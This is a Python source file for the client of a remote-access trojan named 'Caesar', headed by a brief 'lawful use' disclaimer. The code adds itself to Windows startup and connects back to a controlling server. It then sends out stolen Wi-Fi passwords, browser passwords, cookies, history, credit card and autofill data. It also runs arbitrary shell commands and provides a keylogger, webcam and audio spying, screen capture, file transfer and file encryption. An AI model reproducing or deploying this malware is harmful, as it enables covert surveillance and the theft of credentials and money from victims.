#Created by Vasto Boy

#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

import os
import sys
import time
import winreg
import socket
import subprocess
from general_features import GeneralFeatures
from systeminfo_harvester import SystemInfoHarvester


class CaesarClient:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.generalFeatures = GeneralFeatures()
        self.systemInfoHarvester = SystemInfoHarvester()


    def add_to_startup(self, script_path):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_ALL_ACCESS,
            )

            winreg.SetValueEx(key, "Caesar", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
        except Exception as e:
            # print(e)
            pass



    # tries to connect back to the server
    def establish_connection(self):
        self.add_to_startup(os.path.abspath(sys.argv[0]))

        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                break
            except socket.error as err:
                # print(err)
                time.sleep(120) # try to reconnect after 2 minutes

        ######################################## Harvest Target Info ###################################################
        self.systemInfoHarvester.get_platform_info(self.sock)
        self.systemInfoHarvester.send_installed_apps(self.sock)
        self.systemInfoHarvester.get_user_startup_programs(self.sock)
        self.systemInfoHarvester.get_wifi_password(self.sock)

        self.systemInfoHarvester.get_browser_passwords(self.sock)
        self.systemInfoHarvester.get_browser_cookies(self.sock)
        self.systemInfoHarvester.retrieve_browser_history(self.sock)
        self.systemInfoHarvester.retrieve_creditcard_info(self.sock)

        self.systemInfoHarvester.retrieve_autofill_info(self.sock)
        self.systemInfoHarvester.extract_memory_info(self.sock)
        self.systemInfoHarvester.extract_disk_info(self.sock)
        self.systemInfoHarvester.extract_network_info(self.sock)

        self.systemInfoHarvester.get_user_activity(self.sock)
        self.systemInfoHarvester.extract_other_info(self.sock)
        ######################################## Harvest Target Info ###################################################


        # check command sent from the server
        while True:
            cmd = self.sock.recv(65536).decode()
            print(cmd)
            if cmd == " ":
                self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode()) #send current working directory back to server

            elif cmd[:2] == 'cd':
                #change directory
                try:
                    os.chdir(cmd[3:])
                    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = result.stdout.read() + result.stderr.read()
                    result = result.decode()

                    if "The system cannot find the path specified." in result:
                        self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                    else:
                        self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())

                except(FileNotFoundError, IOError):
                    self.sock.send(f"[-]Directory does not exist!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())

            elif cmd.startswith("get "):
                self.generalFeatures.send_client_file(self.sock, cmd[4:])

            elif cmd.startswith("send "):
                usrFile = os.path.basename(cmd[5:])
                self.generalFeatures.receive_server_file(self.sock, usrFile)
            elif cmd == "screenshot":
                self.generalFeatures.screenshot(self.sock)
            elif cmd == "screenfeed":
                self.generalFeatures.live_screen_feed(self.sock)
            elif cmd == "camshot":
                self.generalFeatures.webcam_capture(self.sock)
            elif cmd == "camfeed":
                self.generalFeatures.capture_webcam_video(self.sock)
            elif cmd == "audiofeed":
                self.generalFeatures.live_audio_feed(self.sock)
            elif cmd == "reboot":
                self.generalFeatures.reboot(self.sock)
            elif cmd == "shutdown":
                self.generalFeatures.shutdown(self.sock)
            elif cmd == "start keylogger":
                cmd = cmd.split()
                self.generalFeatures.keylogger_handler(self.sock, cmd[2], cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
            elif cmd == "stop keylogger":
                self.generalFeatures.stop_keylogger(self.sock)
            elif cmd == "keylogger status":
                self.generalFeatures.is_keylogger_active(self.sock)

            elif cmd.startswith("encrypt "):
                cmd = cmd.split(" ", 2)

                if len(cmd) == 3:
                    self.generalFeatures.encrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                elif len(cmd) > 3 or len(cmd) < 3:
                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())

            elif cmd.startswith("decrypt "):
                cmd = cmd.split(" ", 2)
                if len(cmd) == 3:
                    self.generalFeatures.decrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                elif len(cmd) > 3 or len(cmd) < 3:
                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())

            elif cmd == "conn check":
                pass

            elif cmd.startswith("ftp download "):
                cmd = cmd.split(" ", 8)
                if len(cmd) == 8:
                    self.generalFeatures.download_file_via_ftp(self.sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
                elif len(cmd) > 8 or len(cmd) < 8:
                    self.sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_caesar_text('Caesar ').encode() + str(os.getcwd() + ": ").encode())

            elif cmd.startswith("ftp upload"):
                cmd = cmd.split(" ", 8)
                if len(cmd) == 8:
                    self.generalFeatures.upload_file_via_ftp(self.sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
                elif len(cmd) > 8 or len(cmd) < 8:
                    self.sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_caesar_text('Caesar ').encode() + str(os.getcwd() + ": ").encode())

            else:
                try:
                    #return terminal output back to server
                    terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                    terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
                    terminal_output = terminal_output.decode()
                    output = f"{str(terminal_output)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: "
                    self.sock.send(output.encode())

                except Exception as e:
                    output = f"{str(e)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: "
                    self.sock.send(output.encode())
